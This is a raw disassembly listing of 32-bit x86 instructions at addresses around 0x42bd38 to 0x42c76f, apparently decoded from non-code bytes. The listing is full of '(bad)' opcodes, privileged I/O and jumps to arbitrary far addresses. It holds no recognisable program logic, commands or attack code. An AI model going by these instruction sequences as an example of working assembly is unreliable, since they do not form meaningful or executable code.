  42bd38:	fld    TBYTE PTR [esi-0x2a]
  42bd3b:	adc    bx,WORD PTR [ecx+0x13]
  42bd3f:	cld    
  42bd40:	icebp  
  42bd41:	dec    edi
  42bd42:	mov    ah,0xfa
  42bd44:	cs add al,ch
  42bd47:	push   edi
  42bd48:	test   edi,edx
  42bd4a:	(bad)  [ebx]
  42bd4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bd4e:	in     eax,0xfa
  42bd50:	pop    edi
  42bd51:	enter  0x519,0xfc
  42bd55:	cmp    eax,0x8e5edbeb
  42bd5a:	push   eax
  42bd5b:	or     DWORD PTR [ebp-0x6a],esi
  42bd5e:	fs aad 0xd2
  42bd61:	loop   0x42bda7
  42bd63:	retf   
  42bd64:	data16 lahf 
  42bd66:	pop    es
  42bd67:	add    ecx,ecx
  42bd69:	ja     0x42bd8c
  42bd6b:	pop    esi
  42bd6c:	in     eax,0x0
	...
  42bdd6:	mov    al,0xb6
  42bdd8:	pushf  
  42bdd9:	adc    al,0x9e
  42bddb:	ds mov eax,0xffec3b6
  42bde1:	jae    0x42bd78
  42bde3:	cdq    
  42bde4:	cwde   
  42bde5:	fldcw  WORD PTR [eax-0x2b]
  42bde8:	add    DWORD PTR [eax],eax
  42bdea:	inc    DWORD PTR [eax]
  42bdec:	add    BYTE PTR [eax],al
  42bdee:	sbb    BYTE PTR [esi],bl
  42bdf0:	inc    edx
  42bdf1:	sub    ecx,DWORD PTR [ebx+0x23]
  42bdf4:	pusha  
  42bdf5:	aas    
  42bdf6:	sub    DWORD PTR [edi+0x6d03bc0a],eax
  42bdfc:	sbb    ecx,DWORD PTR [ebp-0x40]
  42bdff:	or     eax,0xa87c68a8
  42be04:	jae    0x42be23
  42be06:	inc    esp
  42be07:	les    ecx,FWORD PTR ds:0x51e75659
  42be0d:	xor    DWORD PTR [edx],edi
  42be0f:	sub    edi,DWORD PTR [edx+0x1aca27aa]
  42be15:	mov    WORD PTR [edi],fs
  42be17:	enter  0xd6d9,0x23
  42be1b:	add    ch,cl
  42be1d:	xchg   ebp,eax
  42be1e:	cmc    
  42be1f:	mov    ecx,0xbeaa0880
  42be24:	test   al,0xe4
  42be26:	retf   0x43d3
  42be29:	cs gs pop esp
  42be2c:	and    bl,cl
  42be2e:	popa   
  42be2f:	adc    ebp,DWORD PTR ds:0x7efc015d
  42be35:	test   ebx,0xd79fe953
  42be3b:	push   edx
  42be3c:	sub    eax,0x6a689b81
  42be41:	add    ch,BYTE PTR [ecx-0x7b]
  42be44:	cmp    BYTE PTR [ecx],0x1e
  42be47:	out    dx,eax
  42be48:	mov    eax,0x6efd360e
  42be4d:	loopne 0x42bebb
  42be4f:	aas    
  42be50:	fstp   DWORD PTR [ecx]
  42be52:	sub    bl,BYTE PTR [ecx+0x762deb8e]
  42be58:	stos   DWORD PTR es:[edi],eax
  42be59:	xchg   ebx,eax
  42be5a:	and    BYTE PTR ds:0x2c27b314,cl
  42be60:	sbb    BYTE PTR [edx+0x4be7e6e3],0xf5
  42be67:	add    DWORD PTR [edx-0x724d442e],ebp
  42be6d:	push   esp
  42be6e:	test   al,0xc1
  42be70:	call   0x801f1e29
  42be75:	mov    ecx,0xe9dbc0e9
  42be7a:	push   edi
  42be7b:	mov    eax,0x7f0c7cf9
  42be80:	shr    DWORD PTR [esi+0x78],0x21
  42be84:	into   
  42be85:	(bad)  
  42be86:	popf   
  42be87:	lds    esp,FWORD PTR [edi+0x485aa504]
  42be8d:	xchg   ecx,eax
  42be8e:	inc    esi
  42be8f:	jae    0x42bee5
  42be91:	enter  0xdd6e,0x31
  42be95:	cli    
  42be96:	mov    edi,0x11547d70
  42be9b:	fs ins DWORD PTR es:[edi],dx
  42be9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be9e:	lahf   
  42be9f:	inc    edi
  42bea0:	adc    eax,0xb98fe9d8
  42bea5:	add    eax,0x71d582c4
  42beaa:	jp     0x42be83
  42beac:	pop    esi
  42bead:	push   ecx
  42beae:	les    ebp,FWORD PTR [ebx]
  42beb0:	cmp    DWORD PTR [ebp-0x26],edi
  42beb3:	cmp    al,0xb9
  42beb5:	or     edx,edi
  42beb7:	adc    eax,0x275237bc
  42bebc:	in     eax,0x89
  42bebe:	fst    DWORD PTR [ebp+edx*4+0x40]
  42bec2:	xchg   esi,eax
  42bec3:	fisttp QWORD PTR [edi]
  42bec5:	retf   0xc809
  42bec8:	pushf  
  42bec9:	ja     0x42be6b
  42becb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42becc:	mov    dh,0xd3
  42bece:	sbb    BYTE PTR [ebx],bl
  42bed0:	add    al,0xf7
  42bed2:	or     BYTE PTR [ebp+edx*4+0x77b28b06],bh
  42bed9:	add    eax,edx
  42bedb:	(bad)  
  42bedc:	mov    edi,0x2c6e1910
  42bee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bee2:	cld    
  42bee3:	pop    edx
  42bee4:	inc    esp
  42bee5:	scas   al,BYTE PTR es:[edi]
  42bee6:	mov    ecx,0xf4cdfcd0
  42beeb:	dec    edi
  42beec:	and    DWORD PTR [eax],eax
	...
  42bf56:	xchg   edi,eax
  42bf57:	and    BYTE PTR [edi-0x26],al
  42bf5a:	idiv   edi
  42bf5c:	lahf   
  42bf5d:	ins    DWORD PTR es:[edi],dx
  42bf5e:	mov    ds:0xe37bd7c8,eax
  42bf63:	hlt    
  42bf64:	jecxz  0x42bef3
  42bf66:	addr16 (bad) 
  42bf68:	add    DWORD PTR [eax],eax
  42bf6a:	inc    DWORD PTR [eax]
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	mov    ebx,0x869c4fed
  42bf73:	dec    BYTE PTR [edi+0x13]
  42bf76:	popf   
  42bf77:	and    esi,eax
  42bf79:	push   es
  42bf7a:	inc    esi
  42bf7b:	or     dl,ah
  42bf7d:	jmp    0xdea7:0x42cd5e97
  42bf84:	add    eax,0x2e90d728
  42bf89:	sub    bh,BYTE PTR [esi]
  42bf8b:	add    DWORD PTR [esp+edi*1],eax
  42bf8e:	ret    
  42bf8f:	(bad)  
  42bf91:	cmp    eax,0xfac061b8
  42bf96:	mov    ah,0xdc
  42bf98:	call   FWORD PTR [esi]
  42bf9a:	loop   0x42bfd2
  42bf9c:	fwait
  42bf9d:	cdq    
  42bf9e:	xor    al,0x6d
  42bfa0:	mov    al,ah
  42bfa2:	imul   ecx,DWORD PTR [edi-0x3f],0xfffffffe
  42bfa6:	ja     0x42bf88
  42bfa8:	(bad)  
  42bfa9:	pop    edi
  42bfaa:	repz icebp 
  42bfac:	aaa    
  42bfad:	ja     0x42bfa6
  42bfaf:	jns    0x42bf99
  42bfb1:	outs   dx,DWORD PTR ds:[si]
  42bfb3:	inc    esi
  42bfb4:	cmc    
  42bfb5:	rcr    al,cl
  42bfb7:	pop    es
  42bfb8:	outs   dx,DWORD PTR ds:[esi]
  42bfb9:	mov    cl,0xa9
  42bfbb:	and    al,BYTE PTR [ecx+0x3a]
  42bfbe:	ret    
  42bfbf:	dec    ebx
  42bfc0:	fwait
  42bfc1:	cmp    eax,0xc2c66cef
  42bfc6:	push   eax
  42bfc7:	adc    eax,0x584b6780
  42bfcc:	test   al,0x53
  42bfce:	jne    0x42bfea
  42bfd0:	cmp    dl,BYTE PTR [ebx+edx*2-0x14]
  42bfd4:	xchg   ebx,eax
  42bfd5:	cwde   
  42bfd6:	das    
  42bfd7:	inc    edx
  42bfd8:	jl     0x42c00c
  42bfda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bfdb:	push   ebp
  42bfdc:	outs   dx,DWORD PTR ds:[esi]
  42bfdd:	test   DWORD PTR [edi+eiz*8+0x38],ecx
  42bfe1:	jle    0x42bfa8
  42bfe3:	test   BYTE PTR [eax+0x6a],0x9d
  42bfe7:	dec    esp
  42bfe8:	cmp    DWORD PTR [edx+0x13],0x566ac32a
  42bfef:	pop    esi
  42bff0:	in     eax,0x61
  42bff2:	sub    bh,BYTE PTR fs:[ecx+0x1bd309b4]
  42bff9:	and    eax,0x8906d982
  42bffe:	sbb    al,0x4e
  42c000:	call   0x1c0386f0
  42c005:	and    eax,0xa927c572
  42c00a:	adc    al,0x8b
  42c00c:	sbb    DWORD PTR [esi],ecx
  42c00e:	sbb    eax,0x7303a3d9
  42c013:	mov    bh,0xae
  42c015:	mov    al,0xc0
  42c017:	aam    0x72
  42c019:	out    0xff,eax
  42c01b:	loopne 0x42bfcd
  42c01d:	adc    al,0xce
  42c01f:	push   esi
  42c020:	pop    edx
  42c021:	cmp    esi,DWORD PTR [eax]
  42c023:	jb     0x42c01f
  42c025:	mov    ds:0x943efb27,al
  42c02a:	pushf  
  42c02b:	inc    ebx
  42c02c:	outs   dx,BYTE PTR ds:[esi]
  42c02d:	nop
  42c02e:	add    DWORD PTR [ebp+0x78],ebp
  42c031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c032:	sub    al,0xf1
  42c034:	fidiv  DWORD PTR [ebx-0x4c]
  42c037:	cmp    al,BYTE PTR [esi+0x258c808a]
  42c03d:	mov    gs,WORD PTR [eax]
  42c03f:	jno    0x42bfdd
  42c041:	stos   DWORD PTR es:[edi],eax
  42c042:	pop    ecx
  42c043:	mov    bh,0x60
  42c045:	fnstenv ds:[ebx+0x2a212a5f]
  42c04c:	gs sbb esp,ebp
  42c04f:	jo     0x42c054
  42c051:	sbb    al,0xb
  42c053:	stos   DWORD PTR es:[edi],eax
  42c054:	clc    
  42c055:	mov    dl,0x2d
  42c057:	ret    0x408e
  42c05a:	or     eax,0x59b0a5b0
  42c05f:	imul   BYTE PTR [ecx+0x3d2bd4b0]
  42c065:	mov    al,0xde
  42c067:	imul   ebp,DWORD PTR [ebx+0x19],0xffffffe6
  42c06b:	mov    ah,0x45
	...
  42c0d5:	add    BYTE PTR [edx],bh
  42c0d7:	xchg   edx,eax
  42c0d8:	ja     0x42c10c
  42c0da:	push   edi
  42c0dc:	jg     0x42c078
  42c0de:	leave  
  42c0df:	or     DWORD PTR [edi-0x57],edi
  42c0e2:	xor    al,0xe9
  42c0e4:	and    ch,dl
  42c0e6:	data16 xlat BYTE PTR ds:[ebx]
  42c0e8:	add    DWORD PTR [eax],eax
  42c0ea:	inc    DWORD PTR [eax]
  42c0ec:	add    BYTE PTR [eax],al
  42c0ee:	fcomp  QWORD PTR [edx+edx*4]
  42c0f1:	lock icebp 
  42c0f3:	mov    eax,0xdc6cd265
  42c0f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c0f9:	dec    edx
  42c0fa:	jnp    0x42c14d
  42c0fc:	xor    cl,BYTE PTR [ebx]
  42c0fe:	repnz xchg edx,eax
  42c100:	add    DWORD PTR [esp+edi*1-0x6f941fdc],eax
  42c107:	cmp    DWORD PTR [esi-0x71],eax
  42c10a:	cli    
  42c10b:	pusha  
  42c10c:	bound  edx,QWORD PTR [ebx]
  42c10e:	sar    ecx,cl
  42c110:	xor    al,0xce
  42c112:	dec    esp
  42c113:	xchg   cl,ch
  42c115:	mov    DWORD PTR ds:0x12457cd2,eax
  42c11b:	lods   al,BYTE PTR ds:[esi]
  42c11c:	jne    0x42c10e
  42c11e:	sub    BYTE PTR [ecx],dl
  42c120:	sub    al,0x10
  42c122:	cmp    eax,0x1c087508
  42c127:	repz pop ecx
  42c129:	jecxz  0x42c183
  42c12b:	in     al,dx
  42c12c:	mov    ecx,0x8530600f
  42c131:	push   es
  42c132:	loope  0x42c0b6
  42c134:	(bad)  
  42c136:	out    0x6f,eax
  42c138:	clc    
  42c139:	popa   
  42c13a:	adc    esi,DWORD PTR [edi+0x280fe997]
  42c140:	jmp    0xaa88:0x4fe2b014
  42c147:	sbb    BYTE PTR [edx+0xcaf9436],ah
  42c14d:	pop    DWORD PTR [esi+0x66]
  42c150:	mov    ch,0x7b
  42c152:	mov    dh,0x26
  42c154:	or     BYTE PTR [eax-0x77],ah
  42c157:	(bad)  
  42c158:	push   ds
  42c159:	or     cl,BYTE PTR [ecx+0x957928f]
  42c15f:	mov    dl,0x11
  42c161:	xchg   ebx,eax
  42c162:	adc    DWORD PTR [edi+eax*4+0x1bf72f34],esp
  42c169:	cmp    ebp,ebp
  42c16b:	cwde   
  42c16c:	outs   dx,DWORD PTR ds:[esi]
  42c16d:	or     DWORD PTR [edi+0x40],ebp
  42c170:	dec    ebx
  42c171:	mov    eax,ds:0xa009cda4
  42c176:	xchg   edx,esp
  42c178:	adc    bh,dh
  42c17a:	inc    esi
  42c17b:	fst    QWORD PTR [esi+0x2b4719c6]
  42c181:	mul    BYTE PTR [edi-0x63]
  42c184:	clc    
  42c185:	nop
  42c186:	mov    ecx,0xadf1e613
  42c18b:	ret    
  42c18c:	repz imul eax,DWORD PTR ss:[edx],0xffffffca
  42c191:	mov    ah,0x15
  42c193:	and    ebx,DWORD PTR [ecx+0x7768b599]
  42c199:	rep lods eax,DWORD PTR ds:[esi]
  42c19b:	outs   dx,DWORD PTR ds:[esi]
  42c19c:	leave  
  42c19d:	xchg   edx,eax
  42c19e:	aad    0xcf
  42c1a0:	ds adc bh,bl
  42c1a3:	inc    ebx
  42c1a4:	mov    dh,0xf3
  42c1a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c1a7:	in     eax,dx
  42c1a8:	(bad)  
  42c1a9:	neg    DWORD PTR [edi-0x58]
  42c1ac:	ins    DWORD PTR es:[edi],dx
  42c1ad:	repnz outs dx,BYTE PTR ds:[esi]
  42c1af:	(bad)  
  42c1b0:	xlat   BYTE PTR ds:[ebx]
  42c1b1:	ss mov ah,0x55
  42c1b4:	stc    
  42c1b5:	shr    BYTE PTR [eax+0x1d],0x52
  42c1b9:	lds    esi,FWORD PTR [esi-0x2f]
  42c1bc:	ja     0x42c164
  42c1be:	lea    esp,[ecx]
  42c1c0:	es popf 
  42c1c2:	ret    0xa0ef
  42c1c5:	jmp    FWORD PTR [ecx]
  42c1c7:	sbb    BYTE PTR [edi+0x3c82e153],dh
  42c1cd:	push   ecx
  42c1ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c1cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c1d0:	mov    ?,WORD PTR [ecx+ecx*4]
  42c1d3:	call   0x7c6f413
  42c1d8:	clc    
  42c1d9:	pop    esi
  42c1da:	jnp    0x42c213
  42c1dc:	mov    gs,edx
  42c1de:	pop    ecx
  42c1df:	or     DWORD PTR ds:[edx-0xa],0x2de9ca10
  42c1e7:	or     ebx,esp
  42c1e9:	cmp    eax,0xecb646
	...
  42c256:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c260:	xchg   esp,eax
  42c261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c262:	into   
  42c263:	popa   
  42c264:	push   eax
  42c265:	dec    ebp
  42c266:	fadd   DWORD PTR gs:[ecx]
  42c269:	add    bh,bh
  42c26b:	add    BYTE PTR [eax],al
  42c26d:	add    cl,ah
  42c26f:	shl    DWORD PTR [edx],1
  42c271:	or     al,ah
  42c273:	vpminub ymm4,ymm5,YMMWORD PTR [ebx]
  42c277:	out    0xe5,al
  42c279:	arpl   WORD PTR [eax+0x1b],dx
  42c27c:	jo     0x42c2c0
  42c27e:	sbb    BYTE PTR [ecx],bl
  42c280:	push   edx
  42c281:	into   
  42c282:	int3   
  42c283:	dec    ebp
  42c284:	cmp    al,0x44
  42c286:	aad    0x1c
  42c288:	enter  0xa0ca,0x8f
  42c28c:	mov    ds:0xbdcf63ef,eax
  42c291:	dec    ebx
  42c292:	inc    edx
  42c293:	imul   ebp,edx,0xffffffe6
  42c296:	adc    DWORD PTR [eax-0x2b5821b],ebx
  42c29c:	adc    eax,0x9bccb69
  42c2a1:	mov    ds:0x106b77f5,al
  42c2a6:	push   cs
  42c2a7:	std    
  42c2a8:	and    al,0x13
  42c2aa:	cmp    eax,0x4a5152ec
  42c2af:	sbb    al,0x9f
  42c2b1:	lock (bad) 
  42c2b3:	retf   0x6307
  42c2b6:	push   esi
  42c2b7:	cmp    al,BYTE PTR [ecx-0x56]
  42c2ba:	push   ebx
  42c2bb:	lods   eax,DWORD PTR ds:[esi]
  42c2bc:	mov    DWORD PTR [ecx],ebp
  42c2be:	popf   
  42c2bf:	add    ecx,DWORD PTR [bp+0x4e]
  42c2c3:	mov    eax,ds:0x990bfed1
  42c2c8:	leave  
  42c2c9:	out    dx,eax
  42c2ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2cb:	and    eax,0x524302e2
  42c2d0:	mov    edx,0x2dab630
  42c2d5:	(bad)  
  42c2d7:	sbb    ebx,DWORD PTR [ebx+0x38cfc604]
  42c2dd:	push   edx
  42c2de:	cli    
  42c2df:	dec    edx
  42c2e0:	jg     0x42c308
  42c2e2:	(bad)  
  42c2e3:	(bad)  
  42c2e4:	cmc    
  42c2e5:	int    0x40
  42c2e7:	sbb    al,0x29
  42c2e9:	sbb    esi,0x48
  42c2ec:	(bad)  
  42c2ed:	sbb    ecx,DWORD PTR [ebx+edx*1+0x30]
  42c2f1:	cmp    ebx,DWORD PTR [ecx+eiz*4+0x61]
  42c2f5:	sbb    edi,edx
  42c2f7:	sub    BYTE PTR [ecx],cl
  42c2f9:	jno    0x42c27f
  42c2fb:	jb     0x42c369
  42c2fd:	bound  ebx,QWORD PTR [ecx+0x52]
  42c300:	hlt    
  42c301:	jl     0x42c2b0
  42c303:	nop
  42c304:	sbb    bh,dh
  42c306:	cmp    dh,BYTE PTR [edx+0x24]
  42c309:	call   0xc1fe:0x1ef8d97b
  42c310:	push   edx
  42c311:	add    BYTE PTR [eax-0x1bec3d9f],0x57
  42c318:	outs   dx,DWORD PTR ds:[esi]
  42c319:	stc    
  42c31a:	arpl   dx,di
  42c31c:	or     bh,BYTE PTR [ebp+0x201ddb52]
  42c322:	pop    edi
  42c323:	jmp    0x8335:0x7ff6ef76
  42c32a:	jns    0x42c360
  42c32c:	lds    edx,FWORD PTR [ebp-0x67]
  42c32f:	inc    edx
  42c330:	or     al,0x73
  42c332:	(bad)  
  42c333:	cmc    
  42c334:	pop    ebp
  42c335:	and    edx,DWORD PTR ds:0xb9818b00
  42c33b:	sbb    esp,DWORD PTR [ebp*2-0x3863670f]
  42c342:	push   es
  42c343:	sub    ebp,DWORD PTR [ebp+0x5e]
  42c346:	sbb    eax,0xa17d7e21
  42c34b:	test   BYTE PTR [ebx-0x751dd610],0xb7
  42c352:	arpl   WORD PTR [ebx+ebp*8+0x1870c139],si
  42c359:	push   es
  42c35a:	pop    ds
  42c35b:	fs add ch,bl
  42c35e:	ja     0x42c2f0
  42c360:	das    
  42c361:	ds mov edi,0x6959801b
  42c367:	(bad)  
  42c368:	shl    BYTE PTR [ecx+0x845890],0x0
	...
  42c3d3:	add    BYTE PTR [eax],al
  42c3d5:	add    dh,ah
  42c3d7:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c3db:	push   esi
  42c3dd:	(bad)  
  42c3de:	in     eax,dx
  42c3df:	(bad)  
  42c3e0:	sub    eax,0x4328e7f6
  42c3e5:	jge    0x42c44b
  42c3e7:	fld    DWORD PTR [ecx]
  42c3e9:	add    bh,bh
  42c3eb:	add    BYTE PTR [eax],al
  42c3ed:	add    BYTE PTR [ecx+0x24f06c10],al
  42c3f3:	fisubr DWORD PTR [ebp-0x1a]
  42c3f6:	push   edx
  42c3f7:	arpl   bx,di
  42c3f9:	pop    esp
  42c3fa:	or     DWORD PTR [eax],ecx
  42c3fc:	shl    BYTE PTR [edx+0x3a6928a7],cl
  42c402:	adc    edx,DWORD PTR [ecx+0x449fd2d3]
  42c408:	jle    0x42c3df
  42c40a:	test   ebx,ecx
  42c40c:	popf   
  42c40d:	imul   edx,DWORD PTR [ecx+0x3b],0x36d9e793
  42c414:	xor    DWORD PTR [esi-0x59545363],0xde8685c3
  42c41e:	sbb    DWORD PTR [ebp+ebx*2-0x334df484],0x41b21fa9
  42c429:	dec    eax
  42c42a:	or     eax,0xe2db249b
  42c42f:	leave  
  42c430:	dec    ebp
  42c431:	stos   DWORD PTR es:[edi],eax
  42c432:	or     eax,0xd5688e68
  42c437:	xor    al,0xd8
  42c439:	sub    al,0xdb
  42c43b:	clc    
  42c43c:	in     al,dx
  42c43d:	sub    DWORD PTR [ecx+0x2],edx
  42c440:	xchg   ecx,eax
  42c441:	imul   edi,DWORD PTR [eiz*1-0x3d8d0120],0x544fdd41
  42c44c:	push   esp
  42c44d:	mov    edx,0x970eff7e
  42c452:	inc    ebx
  42c453:	add    DWORD PTR [ebp-0x37580ea7],0x7a
  42c45a:	in     eax,dx
  42c45b:	xchg   esp,eax
  42c45c:	ins    DWORD PTR es:[edi],dx
  42c45d:	or     esp,edi
  42c45f:	and    bh,ch
  42c461:	aam    0xe8
  42c463:	rol    dh,0x28
  42c466:	lea    esp,[esi-0x7d]
  42c469:	jg     0x42c4c1
  42c46b:	pop    es
  42c46c:	outs   dx,BYTE PTR ds:[esi]
  42c46d:	mov    DWORD PTR [ecx+0x3990dabe],edi
  42c473:	push   eax
  42c474:	rcl    DWORD PTR [esi+ebx*2-0x6],cl
  42c478:	and    DWORD PTR [eax],0xffffffa6
  42c47b:	xor    BYTE PTR [edi],dh
  42c47d:	rcr    BYTE PTR [ecx-0x3b],0xce
  42c481:	xchg   BYTE PTR [edx-0xb06c84c],bl
  42c487:	push   es
  42c488:	adc    ch,BYTE PTR [ebx-0x36]
  42c48b:	or     eax,0xaf47af58
  42c490:	push   edx
  42c491:	jl     0x42c4ce
  42c493:	retf   0x5d2b
  42c496:	clc    
  42c497:	inc    eax
  42c498:	fsub   DWORD PTR [esi-0x4331eea3]
  42c49e:	xchg   DWORD PTR [ebx],ebp
  42c4a0:	outs   dx,BYTE PTR ds:[esi]
  42c4a1:	xchg   edx,eax
  42c4a2:	pop    edx
  42c4a3:	jle    0x42c4ab
  42c4a5:	das    
  42c4a6:	call   0xdcbb:0x2dca7aed
  42c4ad:	sub    BYTE PTR [eax],dh
  42c4af:	or     esi,edi
  42c4b1:	add    dh,cl
  42c4b3:	in     al,0x23
  42c4b5:	loopne 0x42c4e3
  42c4b7:	mov    eax,ds:0xf58fce70
  42c4bc:	retf   0x2363
  42c4bf:	adc    ebx,DWORD PTR [esi-0x2f3edcc9]
  42c4c5:	das    
  42c4c6:	js     0x42c4ba
  42c4c8:	iret   
  42c4c9:	xchg   edx,eax
  42c4ca:	aam    0xde
  42c4cc:	mov    al,0x80
  42c4ce:	lahf   
  42c4cf:	adc    eax,0x84a4805f
  42c4d4:	mov    al,0xf5
  42c4d6:	push   ebx
  42c4d7:	loopne 0x42c53b
  42c4d9:	sub    cl,cl
  42c4db:	or     DWORD PTR [edi],esi
  42c4dd:	leave  
  42c4de:	ds and al,0xcf
  42c4e1:	mov    BYTE PTR [esi+ebx*8],dh
  42c4e4:	push   ss
  42c4e5:	add    al,BYTE PTR [ebx]
  42c4e7:	shr    DWORD PTR [edi+0x7450cc50],1
	...
  42c555:	add    ah,ch
  42c557:	sbb    ebp,edx
  42c559:	sahf   
  42c55a:	cmc    
  42c55b:	fsubp  st(7),st
  42c55d:	jnp    0x42c511
  42c55f:	sti    
  42c560:	enter  0xb934,0xa
  42c564:	into   
  42c565:	(bad)  
  42c566:	arpl   dx,bx
  42c568:	add    DWORD PTR [eax],eax
  42c56a:	inc    DWORD PTR [eax]
  42c56c:	add    BYTE PTR [eax],al
  42c56e:	repz ror DWORD PTR [ecx-0x185b93f7],0x46
  42c576:	lods   al,BYTE PTR ds:[esi]
  42c577:	jg     0x42c515
  42c579:	daa    
  42c57a:	std    
  42c57b:	or     edx,DWORD PTR [ecx-0x3e5a0f22]
  42c581:	push   ecx
  42c582:	jbe    0x42c5b1
  42c584:	push   eax
  42c585:	mov    DWORD PTR [ebp+0x1a],edx
  42c588:	mov    cx,0x831c
  42c58c:	xor    BYTE PTR [esi],0xe7
  42c58f:	int3   
  42c590:	fmul   DWORD PTR [ecx]
  42c592:	sub    bl,dl
  42c594:	imul   esi,ebx,0xffffffbd
  42c597:	scas   eax,DWORD PTR es:[edi]
  42c598:	in     al,dx
  42c599:	outs   dx,DWORD PTR ds:[esi]
  42c59a:	fadd   DWORD PTR [ebp+0x23]
  42c59d:	cld    
  42c59e:	neg    BYTE PTR [esi-0x39]
  42c5a1:	pop    ebp
  42c5a2:	jno    0x42c539
  42c5a4:	xchg   ecx,eax
  42c5a5:	add    eax,0xba15ba17
  42c5aa:	sbb    DWORD PTR [esi-0x3d1a5103],esp
  42c5b0:	sub    al,0x84
  42c5b2:	push   edi
  42c5b3:	andnps xmm3,XMMWORD PTR [ecx]
  42c5b6:	adc    ebp,DWORD PTR [edx+esi*8-0x43]
  42c5ba:	test   DWORD PTR [esp+esi*1],ebp
  42c5bd:	(bad)  
  42c5be:	fstp   QWORD PTR [ecx-0x1f045e57]
  42c5c4:	and    cl,BYTE PTR [edx]
  42c5c6:	xchg   ebp,eax
  42c5c7:	shl    WORD PTR [edx+0x233e5149],cl
  42c5ce:	xor    eax,0x86530489
  42c5d3:	dec    edx
  42c5d4:	int    0x27
  42c5d6:	fs ja  0x42c5dc
  42c5d9:	mov    dh,0x95
  42c5db:	sti    
  42c5dc:	(bad)  
  42c5dd:	push   edx
  42c5de:	and    eax,0x381e75a0
  42c5e3:	shl    DWORD PTR [ecx+0x46],0x14
  42c5e7:	repz push es
  42c5e9:	pop    ds
  42c5ea:	inc    edx
  42c5eb:	mov    eax,ds:0x4e535859
  42c5f0:	sbb    cl,BYTE PTR [esp+edx*1-0x1]
  42c5f4:	shl    DWORD PTR [edi+0xe4bd945],1
  42c5fa:	and    eax,DWORD PTR [esi+0x1b]
  42c5fd:	scas   al,BYTE PTR es:[edi]
  42c5fe:	fcom   QWORD PTR [ebp-0x2b407466]
  42c604:	add    eax,0x54442078
  42c609:	and    DWORD PTR [edi+0x4d24436c],esp
  42c60f:	mov    ds:0x1b6a4712,al
  42c614:	dec    eax
  42c615:	lock pop es
  42c617:	fbstp  TBYTE PTR [esp+ecx*1-0x212e518c]
  42c61e:	mov    ecx,0x83e8d92f
  42c623:	mov    bl,0xdf
  42c625:	and    BYTE PTR [eax-0x32822795],dl
  42c62b:	xor    ecx,esi
  42c62d:	dec    ecx
  42c62e:	sub    DWORD PTR [esi],ecx
  42c630:	push   esp
  42c631:	and    esp,DWORD PTR [eax-0x4b]
  42c634:	xor    eax,0xf8b75d28
  42c639:	xlat   BYTE PTR ds:[ebx]
  42c63a:	and    eax,0xf8944f46
  42c63f:	(bad)  
  42c640:	xchg   esi,eax
  42c641:	pushf  
  42c642:	lds    edi,FWORD PTR [edx]
  42c644:	sbb    al,0x5b
  42c646:	pop    ecx
  42c647:	mov    edx,cs
  42c649:	loope  0x42c6a0
  42c64b:	pop    ebx
  42c64c:	daa    
  42c64d:	cmp    eax,0x2e003210
  42c652:	xor    ebp,DWORD PTR ds:0x84174166
  42c658:	dec    esp
  42c659:	cmc    
  42c65a:	(bad)  
  42c65b:	in     al,dx
  42c65c:	sar    DWORD PTR [eax-0x34],0xac
  42c660:	inc    edx
  42c661:	inc    ebp
  42c662:	dec    bx
  42c664:	or     ah,ah
  42c666:	int    0x61
  42c668:	add    DWORD PTR [ebp+0x57],esi
  42c66b:	cmp    edi,DWORD PTR [eax+eax*1+0x0]
	...
  42c6d3:	add    BYTE PTR [eax],al
  42c6d5:	add    BYTE PTR [ebp+0x48],bl
  42c6d8:	jle    0x42c668
  42c6da:	jg     0x42c69a
  42c6dc:	std    
  42c6dd:	fstp   TBYTE PTR [ebx-0x18920395]
  42c6e3:	rol    DWORD PTR fs:[edx+eiz*2-0xfffe25],1
  42c6eb:	add    BYTE PTR [eax],al
  42c6ed:	add    BYTE PTR [ecx],al
  42c6ef:	sub    BYTE PTR [edx+0x5097f1cc],bl
  42c6f5:	push   cs
  42c6f6:	(bad)  [edx+0x68047011]
  42c6fc:	jmp    0x42c6b2
  42c6fe:	push   0xffffff99
  42c700:	cmp    dh,0x14
  42c703:	ja     0x42c6d3
  42c705:	mov    dh,0x83
  42c707:	jne    0x42c6af
  42c709:	repnz push ss
  42c70b:	sti    
  42c70c:	xchg   DWORD PTR [edi-0x2c82fcea],esi
  42c712:	test   dl,dh
  42c714:	into   
  42c715:	adc    eax,0x313e7792
  42c71a:	inc    edx
  42c71b:	pop    ds
  42c71c:	xchg   esp,eax
  42c71d:	arpl   di,si
  42c71f:	cli    
  42c720:	jp     0x42c761
  42c722:	enter  0xf5c2,0xcf
  42c726:	adc    esi,DWORD PTR [eax+0x46]
  42c729:	mov    edx,0xa3606bc4
  42c72e:	mov    ds:0x65cd7b8f,al
  42c733:	ret    
  42c734:	pop    esi
  42c735:	push   ds
  42c736:	mov    al,ds:0xed69ef69
  42c73b:	xchg   esp,eax
  42c73c:	cmp    eax,0x256b68b4
  42c741:	adc    BYTE PTR [ebx+0x47a4d4b6],bl
  42c747:	and    eax,0xafdd936f
  42c74c:	test   eax,0x6882c275
  42c751:	leave  
  42c752:	add    edx,DWORD PTR [esi-0x14]
  42c755:	mov    edi,0x9ebe2313
  42c75a:	push   ebp
  42c75b:	icebp  
  42c75c:	hlt    
  42c75d:	or     ebp,DWORD PTR [ecx+eax*4]
  42c760:	outs   dx,DWORD PTR ds:[esi]
  42c761:	stos   DWORD PTR es:[edi],eax
  42c762:	xchg   edi,eax
  42c763:	jo     0x42c6ff
  42c765:	fs out dx,eax
  42c767:	(bad)  
  42c768:	jg     0x42c7c5
  42c76a:	mov    al,ds:0x58dff87b
  42c76f:	add    DWORD PTR [ebx+0x4a],0x59
